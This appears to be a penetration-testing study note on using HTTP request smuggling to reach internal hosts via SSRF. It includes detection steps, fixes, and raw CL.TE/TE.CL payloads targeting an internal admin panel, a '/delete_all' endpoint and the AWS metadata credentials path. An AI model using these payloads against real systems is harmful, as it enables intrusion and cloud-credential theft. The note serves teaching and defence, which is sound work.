---
tags: [vapt, smuggling, ssrf, critical]
difficulty: advanced
module: "26 - HTTP Request Smuggling"
topic: "26.10 Smuggling to Escalate SSRF"
---

# 26.10 — Smuggling to Escalate SSRF

## What is it?
Server-Side Request Forgery (SSRF) occurs when an application makes an HTTP request to an internal or external server on behalf of the attacker. Usually, this is triggered by passing a URL to a parameter like `?url=http://localhost/admin`.

However, what if the application has a reverse proxy (Front-End) that is vulnerable to Request Smuggling, and that proxy routes traffic to different internal Back-End systems based on the `Host` header? 

**Smuggling to Escalate SSRF** occurs when an attacker smuggles a request with a manipulated `Host` header. The Front-End sees the carrier request's normal `Host` header and routes it to the standard web server. Once there, the web server processes the smuggled request. Because the smuggled request contains an internal `Host` header (e.g., `Host: internal-admin-panel`), the web server effectively acts as a pivot point, executing requests against internal infrastructure that the attacker could never route to directly.

Think of it like a mailroom. You send a large envelope addressed to "Public Relations Dept." The mailroom (Front-End) routes it there. When the PR employee opens the envelope, they find a smaller letter inside that says "Deliver immediately to Top Secret HR Dept." Because the letter is already inside the building, the internal mail system delivers it, bypassing the external security checks.

## ASCII Diagram
```text
================================================================================
                    ESCALATING SSRF VIA SMUGGLING
================================================================================

[Network Architecture]
- Front-End WAF (Public IP)
- Back-End Web Server (10.0.0.5)
- Internal Admin Server (10.0.0.99) - Blocked from external access!

[1. Attacker sends CL.TE Payload]
POST / HTTP/1.1
Host: public-web.com               <-- Front-End routes to 10.0.0.5
Transfer-Encoding: chunked

0

GET /delete_all HTTP/1.1           <-- SMUGGLED REQUEST
Host: 10.0.0.99                    <-- Targets internal server!
X-Ignore: X

[2. Back-End Execution]
Back-End Web Server (10.0.0.5) parses the chunked payload.
It extracts the smuggled request: `GET /delete_all HTTP/1.1\r\nHost: 10.0.0.99`.
The Back-End Web Server executes the request! Because it is on the same internal 
network, it successfully hits the internal admin server.

[Result: Full SSRF achieved via Smuggling.]
================================================================================
```

## How to Find It
- **Manual steps:**
  1. Confirm a smuggling vulnerability (CL.TE, TE.CL).
  2. Map out the internal infrastructure if possible (e.g., by analyzing Javascript files, error messages, or documentation that mentions internal hostnames like `admin.local`, `internal.corp.com`, or IP ranges like `192.168.x.x`).
  3. Craft a smuggled request where you aggressively manipulate the `Host` header or the Request Line URI.
  4. Use a Burp Collaborator payload in the `Host` header (e.g., `Host: your-collab.oastify.com`). If you receive a ping, the backend server is executing requests to external servers based on the smuggled Host header (Blind SSRF).
  5. Once Out-of-Band SSRF is confirmed, pivot to targeting internal IPs (`Host: localhost`, `Host: 169.254.169.254`, `Host: 10.0.0.1`).

## How to Exploit It
- **Step-by-step walkthrough:**
  Let's target the AWS metadata service.
  1. The target is hosted on AWS and vulnerable to TE.CL.
  2. Craft a TE.CL payload where the smuggled request targets the AWS IMDS (Instance Metadata Service) IP address.
  3. Send the payload:
     ```http
     POST / HTTP/1.1
     Host: vulnerable.com
     Content-Length: 4
     Transfer-Encoding: chunked
     
     70
     GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
     Host: 169.254.169.254
     
     0
     
     ```
  4. Wait for the next user to connect.
  5. The backend server acts as an open proxy for the smuggled request. It fetches the AWS IAM credentials from the metadata service.
  6. The backend appends the victim's request to the response and sends it back to the victim (Response Queue Poisoning).
  7. **Note:** To actually *read* the credentials, you must chain this with "Capture Other Users' Requests" (See [[08 - Smuggling to Capture Other Users' Requests]]) so the backend writes the metadata response into a storage location you control.

- **Actual payloads:**
  **Smuggling a request to an internal admin panel (CL.TE):**
  ```http
  POST / HTTP/1.1
  Host: vulnerable.com
  Content-Length: 54
  Transfer-Encoding: chunked
  
  0
  
  GET /admin HTTP/1.1
  Host: admin-internal.local
  X: X
  ```

## Real-World Example
A Bug Bounty hunter targeted a company's main marketing site. The site was completely static and had no parameters to test for traditional SSRF. However, the hunter found a CL.TE vulnerability. The hunter noticed the company's engineering blog mentioned an internal tool hosted at `http://jenkins.internal`. The hunter smuggled a request with `Host: jenkins.internal` and a path of `/script` (the Jenkins Groovy script console). The backend marketing server parsed the smuggled request and, acting as a proxy, routed it to the internal Jenkins server. The hunter executed remote code on the Jenkins server, pivoting from a static marketing site to full corporate network compromise.

## How to Fix It
- **Developer remediation:**
  1. Fix the smuggling vulnerability (See [[01 - What is HTTP Request Smuggling?]]).
  2. **Host Header Validation:** The Back-End server must rigidly validate the `Host` header. If the Back-End expects traffic for `public-web.com`, it should immediately reject any request (including smuggled ones) that contain `Host: 10.0.0.99` or `Host: localhost`.
  3. **Network Segmentation:** The public-facing Web Server should be placed in a DMZ (Demilitarized Zone) with strict firewall rules that prevent it from communicating with highly sensitive internal servers (like Jenkins or Admin panels) unless absolutely necessary.

## Chaining Opportunities
- This vuln + [[01 - SSRF (Server-Side Request Forgery)]] → Smuggling is merely the delivery mechanism; SSRF is the impact.
- This vuln + [[08 - Smuggling to Capture Other Users' Requests]] → Required to actually read the data retrieved by the SSRF attack.

## Related Notes
- [[01 - What is HTTP Request Smuggling?]]
- [[01 - SSRF (Server-Side Request Forgery)]]
